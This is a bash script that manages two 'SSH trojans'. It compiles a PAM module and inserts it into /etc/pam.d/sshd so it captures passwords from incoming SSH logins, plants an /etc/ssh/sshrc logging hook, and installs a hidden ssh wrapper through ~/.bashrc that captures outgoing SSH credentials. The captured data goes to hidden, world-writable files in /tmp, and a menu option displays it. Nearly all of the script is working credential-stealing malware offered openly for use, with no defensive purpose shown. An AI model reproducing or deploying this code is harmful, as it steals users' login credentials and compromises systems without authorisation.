#!/bin/bash

# SSH Trojans Management Script
# This script manages installation and verification of both SSH trojans

# Colors for terminal output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Check if running as root for sshtrojan1
check_root() {
    if [ "$(id -u)" -ne 0 ] && [ "$1" = "1" ]; then
        echo -e "${RED}Error: sshtrojan1 requires root privileges.${NC}"
        echo -e "Please run with: ${YELLOW}sudo $0${NC}"
        exit 1
    fi
}

# Display banner
display_banner() {
    echo -e "${BLUE}=================================================${NC}"
    echo -e "${BLUE}           SSH Trojans Management Tool           ${NC}"
    echo -e "${BLUE}=================================================${NC}"
    echo
}

# Check if sshtrojan1 is installed and working
check_sshtrojan1() {
    echo -e "${YELLOW}Checking sshtrojan1 (PAM module for incoming SSH)...${NC}"
    
    # Check if PAM module exists
    PAM_DIR=$(find /lib /usr/lib -name "pam_*.so" | head -n 1 | xargs dirname)
    if [ -f "$PAM_DIR/pam_sshtrojan.so" ]; then
        echo -e "  ${GREEN}✓${NC} PAM module exists at $PAM_DIR/pam_sshtrojan.so"
    else
        echo -e "  ${RED}✗${NC} PAM module not found"
        return 1
    fi
    
    # Check if module is configured in PAM
    if grep -q "pam_sshtrojan.so" /etc/pam.d/sshd; then
        echo -e "  ${GREEN}✓${NC} PAM module configured in /etc/pam.d/sshd"
    else
        echo -e "  ${RED}✗${NC} PAM module not configured in SSH PAM"
        return 1
    fi
    
    # Check if log file exists and is writable
    if [ -f "/tmp/.log_sshtrojan1.txt" ] && [ -w "/tmp/.log_sshtrojan1.txt" ]; then
        echo -e "  ${GREEN}✓${NC} Log file exists and is writable"
    else
        echo -e "  ${RED}✗${NC} Log file issues detected"
        return 1
    fi
    
    # Check if sshd service is running
    if systemctl is-active --quiet ssh; then
        echo -e "  ${GREEN}✓${NC} SSH service is running"
    else
        echo -e "  ${RED}✗${NC} SSH service is not running"
        return 1
    fi
    
    return 0
}

# Install/fix sshtrojan1
install_sshtrojan1() {
    echo -e "${YELLOW}Installing/fixing sshtrojan1...${NC}"
    
    # Ensure log files exist and are writable
    echo "  Creating log files..."
    touch /tmp/.log_sshtrojan1.txt
    chmod 666 /tmp/.log_sshtrojan1.txt
    touch /tmp/.log_sshtrojan1_backup.txt
    chmod 666 /tmp/.log_sshtrojan1_backup.txt
    
    # Compile and install PAM module
    echo "  Compiling PAM module..."
    gcc -fPIC -shared -o pam_sshtrojan.so sshtrojan1.c -lpam
    if [ $? -ne 0 ]; then
        echo -e "  ${RED}Failed to compile PAM module${NC}"
        return 1
    fi
    
    # Find PAM directory and install module
    PAM_DIR=$(find /lib /usr/lib -name "pam_*.so" | head -n 1 | xargs dirname)
    cp pam_sshtrojan.so $PAM_DIR/
    chmod 755 $PAM_DIR/pam_sshtrojan.so
    
    # Configure PAM 
    echo "  Configuring PAM..."
    grep -q "pam_sshtrojan.so" /etc/pam.d/sshd || sed -i '1i auth optional pam_sshtrojan.so' /etc/pam.d/sshd
    
    # Set up sshrc for additional credential capture
    echo "  Setting up SSH login hooks..."
    cat > /etc/ssh/sshrc << 'EOF'
#!/bin/bash
# Log SSH login information
echo "[$(date)] User $USER logged in from $SSH_CLIENT" >> /tmp/.log_sshtrojan1.txt
EOF
    chmod +x /etc/ssh/sshrc
    
    # Restart SSH service
    echo "  Restarting SSH service..."
    systemctl restart ssh
    
    echo -e "  ${GREEN}sshtrojan1 installation completed${NC}"
    return 0
}

# Check if sshtrojan2 is installed and working
check_sshtrojan2() {
    echo -e "${YELLOW}Checking sshtrojan2 (wrapper for outgoing SSH)...${NC}"
    
    # Check if wrapper exists
    if [ -f "/tmp/.sshtrojan2/ssh" ] && [ -x "/tmp/.sshtrojan2/ssh" ]; then
        echo -e "  ${GREEN}✓${NC} SSH wrapper exists and is executable"
    else
        echo -e "  ${RED}✗${NC} SSH wrapper not found or not executable"
        return 1
    fi
    
    # Check if PATH includes wrapper directory
    if [[ ":$PATH:" == *":/tmp/.sshtrojan2:"* ]]; then
        echo -e "  ${GREEN}✓${NC} PATH includes wrapper directory"
    else
        echo -e "  ${RED}✗${NC} PATH does not include wrapper directory"
        return 1
    fi
    
    # Check if bashrc has been modified
    if grep -q "/tmp/.sshtrojan2" ~/.bashrc; then
        echo -e "  ${GREEN}✓${NC} Wrapper installed in ~/.bashrc"
    else
        echo -e "  ${RED}✗${NC} Wrapper not installed in ~/.bashrc"
        return 1
    fi
    
    # Check if expect is installed
    if command -v expect &> /dev/null; then
        echo -e "  ${GREEN}✓${NC} expect utility is installed"
    else
        echo -e "  ${RED}✗${NC} expect utility is not installed"
        return 1
    fi
    
    return 0
}

# Install/fix sshtrojan2
install_sshtrojan2() {
    echo -e "${YELLOW}Installing/fixing sshtrojan2...${NC}"
    
    # Ensure expect is installed
    echo "  Checking for expect..."
    if ! command -v expect &> /dev/null; then
        echo "  Installing expect..."
        apt-get update && apt-get install -y expect
    fi
    
    # Create log file
    echo "  Creating log file..."
    touch /tmp/.log_sshtrojan2.txt
    chmod 666 /tmp/.log_sshtrojan2.txt
    
    # Run the installation script
    echo "  Running sshtrojan2.sh..."
    bash sshtrojan2.sh
    
    echo -e "  ${GREEN}sshtrojan2 installation completed${NC}"
    return 0
}

# View logs from trojans
view_logs() {
    echo -e "${YELLOW}Viewing trojan logs:${NC}"
    
    echo -e "${BLUE}sshtrojan1 logs (incoming SSH):${NC}"
    if [ -f "/tmp/.log_sshtrojan1.txt" ]; then
        cat /tmp/.log_sshtrojan1.txt
    else
        echo "  No logs found"
    fi
    
    echo
    echo -e "${BLUE}sshtrojan2 logs (outgoing SSH):${NC}"
    if [ -f "/tmp/.log_sshtrojan2.txt" ]; then
        cat /tmp/.log_sshtrojan2.txt
    else
        echo "  No logs found"
    fi
}

# Test sshtrojan1
test_sshtrojan1() {
    echo -e "${YELLOW}Testing sshtrojan1...${NC}"
    echo "  This test will verify if the sshtrojan1 PAM module is working."
    echo "  The module captures credentials for incoming SSH connections."
    echo
    echo "  To test:"
    echo "  1. From another computer or terminal, SSH to this machine:"
    echo -e "     ${GREEN}ssh $(whoami)@$(hostname -I | awk '{print $1}')${NC}"
    echo "  2. Enter your password when prompted"
    echo "  3. Return to this terminal and check if credentials were captured"
    echo
    read -p "Press Enter after testing to check logs..."
    
    echo
    echo -e "${BLUE}Checking sshtrojan1 logs:${NC}"
    if [ -f "/tmp/.log_sshtrojan1.txt" ]; then
        tail -n 5 /tmp/.log_sshtrojan1.txt
    else
        echo "  No logs found"
    fi
}

# Test sshtrojan2
test_sshtrojan2() {
    echo -e "${YELLOW}Testing sshtrojan2...${NC}"
    echo "  This test will verify if the sshtrojan2 wrapper is working."
    echo "  The wrapper captures credentials for outgoing SSH connections."
    echo
    echo "  To test, open a new terminal and run:"
    echo -e "     ${GREEN}ssh user@someserver${NC}"
    echo "  (Replace with a valid SSH destination)"
    echo "  Enter your password when prompted"
    echo "  Return to this terminal and check if credentials were captured"
    echo
    read -p "Press Enter after testing to check logs..."
    
    echo
    echo -e "${BLUE}Checking sshtrojan2 logs:${NC}"
    if [ -f "/tmp/.log_sshtrojan2.txt" ]; then
        tail -n 5 /tmp/.log_sshtrojan2.txt
    else
        echo "  No logs found"
    fi
}

# Show usage information
show_usage() {
    echo -e "${BLUE}Usage:${NC}"
    echo "  1. Install/fix sshtrojan1 (requires root)"
    echo "  2. Install/fix sshtrojan2"
    echo "  3. Check trojans status"
    echo "  4. View captured credentials"
    echo "  5. Test sshtrojan1"
    echo "  6. Test sshtrojan2"
    echo "  7. Exit"
    echo
    echo -e "${YELLOW}Note:${NC} sshtrojan1 captures incoming SSH credentials"
    echo -e "      sshtrojan2 captures outgoing SSH credentials"
    echo
}

# Main function
main() {
    display_banner
    
    while true; do
        show_usage
        read -p "Enter your choice [1-7]: " choice
        echo
        
        case $choice in
            1)
                check_root 1
                install_sshtrojan1
                ;;
            2)
                install_sshtrojan2
                ;;
            3)
                check_root 1
                check_sshtrojan1
                echo
                check_sshtrojan2
                ;;
            4)
                view_logs
                ;;
            5)
                test_sshtrojan1
                ;;
            6)
                test_sshtrojan2
                ;;
            7)
                echo -e "${GREEN}Exiting...${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid choice. Please enter a number between 1 and 7.${NC}"
                ;;
        esac
        
        echo
        read -p "Press Enter to continue..."
        clear
        display_banner
    done
}

# Run main function
main
